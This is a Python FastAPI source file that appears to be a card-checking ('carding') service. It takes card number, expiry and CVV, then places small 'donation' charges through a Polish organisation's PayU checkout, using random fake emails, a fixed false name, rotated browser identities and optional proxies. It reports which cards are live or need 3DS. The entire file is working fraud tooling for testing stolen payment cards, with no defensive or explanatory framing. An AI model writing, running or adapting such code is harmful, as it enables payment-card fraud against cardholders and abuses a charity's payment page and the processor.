from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import re
import json
import time
import random
import string
import requests

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    ]
    return random.choice(versions)

def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {token}',
        'priority': 'u=1, i',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }

    data = {}
    for i in range(max_attempts):
        time.sleep(delay)
        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)

        try:
            data = r.json()
        except Exception:
            try:
                data = json.loads(r.text)
            except Exception:
                data = {"raw": r.text, "status_code": r.status_code}

        category = data.get('category')
        if category not in ('IN_PROGRESS', 'NEW'):
            return data

        if i == max_attempts - 1:
            return data

    return data

def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
    """Synchronous PayU charge check via Centaurus API"""
    session = requests.Session()
    try:
        email = _random_email()
        ua = _random_ua()
        name = "Jan Kowalski"

        if proxy_str:
            session.proxies = {
                'http': proxy_str,
                'https': proxy_str,
            }

        if len(yy) == 2:
            yy = '20' + yy

        # ─── Step 1: Create order via Centaurus REST API ───
        headers1 = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://beta3.centaurus.org.pl',
            'referer': 'https://beta3.centaurus.org.pl/payu/',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
        }

        # Struktur JSON yang dijangkakan oleh sistem ini
        payload1 = {
            "amount": 500, # 5.00 PLN
            "description": "Donation",
            "email": email,
            "firstName": name.split()[0],
            "lastName": name.split()[1]
        }

        r1 = session.post('https://beta3.centaurus.org.pl/payu/create', headers=headers1, json=payload1, timeout=30)

        try:
            res1 = r1.json()
        except Exception:
            return 'Failed to parse JSON from Centaurus', {"raw": r1.text, "status_code": r1.status_code}

        # Cuba ekstrak orderId dan token dari response JSON
        order_id = res1.get('orderId') or res1.get('order_id')
        token = res1.get('token') or res1.get('payu_token')

        # Kalau tak jumpa terus, mungkin dia return redirect URL
        if not order_id or not token:
            redirect = res1.get('redirectUri') or res1.get('redirect_url') or res1.get('url') or ''
            if redirect:
                oid = re.search(r'orderId=([^&]+)', redirect)
                tok = re.search(r'token=([^&]+)', redirect)
                if oid: order_id = oid.group(1)
                if tok: token = tok.group(1)

        if not order_id or not token:
            return 'Failed to extract orderId or token', {"error": "Missing keys in JSON", "raw_response": res1}

        # ─── Step 2: Load PayU pay page ───
        params2 = {'orderId': order_id, 'token': token}

        headers2 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://beta3.centaurus.org.pl/',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }

        page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
        
        final_amount = 500 
        final_currency = 'PLN'
        
        try:
            html_content = page_resp.text
            amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', html_content)
            curr_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', html_content)
            if amt_match: final_amount = int(amt_match.group(1))
            if curr_match: final_currency = curr_match.group(1)
        except:
            pass

        # ─── Step 3: Tokenize card ───
        headers3 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {token}',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
        }

        json3 = {
            'posId': 'PAYU S.A.',
            'type': 'SINGLE',
            'card': {
                'number': cc,
                'cvv': cvv_code, 
                'expirationMonth': mm,
                'expirationYear': yy,
            },
        }

        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)

        try:
            token_data = r3.json()
        except Exception:
            try:
                token_data = json.loads(r3.text)
            except Exception:
                token_data = {"raw": r3.text, "status_code": r3.status_code}

        card_token = token_data.get('value')

        if not card_token:
            error_msg = token_data.get('error', {}).get('message', '') if isinstance(token_data.get('error'), dict) else str(token_data.get('error', ''))
            if error_msg:
                return f'Tokenization failed: {error_msg}', token_data
            return f'Failed to tokenize card', token_data

        # ─── Step 4: Submit payment ───
        masked = cc[:6] + '*' * 6 + cc[-4:]

        json4 = {
            'email': email,
            'firstName': name.split()[0],
            'lastName': name.split()[1],
            'currency': final_currency,
            'amount': final_amount,
            'payMethod': {
                'type': 'c',
                'token': card_token,
                'cardDetails': {
                    'maskedCardNumber': masked,
                },
            },
            'metadata': {'cardInputTime': 9039},
            'browserData': {
                'screenWidth': 800,
                'javaEnabled': False,
                'timezoneOffset': -330,
                'screenHeight': 1280,
                'userAgent': ua,
                'colorDepth': 24,
                'language': 'en-US',
                'challengeWindowSize': '04',
            },
            'language': 'en',
        }

        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)

        try:
            pay_data = r4.json()
        except Exception:
            try:
                pay_data = json.loads(r4.text)
            except Exception:
                pay_data = {"raw": r4.text, "status_code": r4.status_code}

        if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
            return f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', pay_data

        continue_url = pay_data.get('continueUrl')

        # ─── Step 5: Poll for result ───
        if continue_url and 'threeds' in continue_url:
            final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
        else:
            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)

        category = final_status.get('category', '')
        value = final_status.get('value', '')

        if category == 'SUCCESS':
            return 'Payment Successful', final_status
        elif category == 'ERROR':
            return f'Payment declined: {value}', final_status
        elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
            return '3DS Required (Card Live)', final_status
        else:
            return f'{category}: {value}' if category else f'Unknown: {value}', final_status

    except requests.exceptions.Timeout:
        return 'Timeout from Payment Gateway', {}
    except Exception as e:
        return f'Error: {str(e)}', {}
    finally:
        session.close()

@app.get("/check")
def check_card(cc: str = Query(...)):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
    
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
        
    try:
        message, raw_data = _payu_sync(card_num, mm, yy, cvv_code)
        return {
            "message": message,
            "raw": raw_data
        }
    except Exception as e:
        return {
            "message": f"Process crashed: {str(e)}",
            "raw": {}
        }
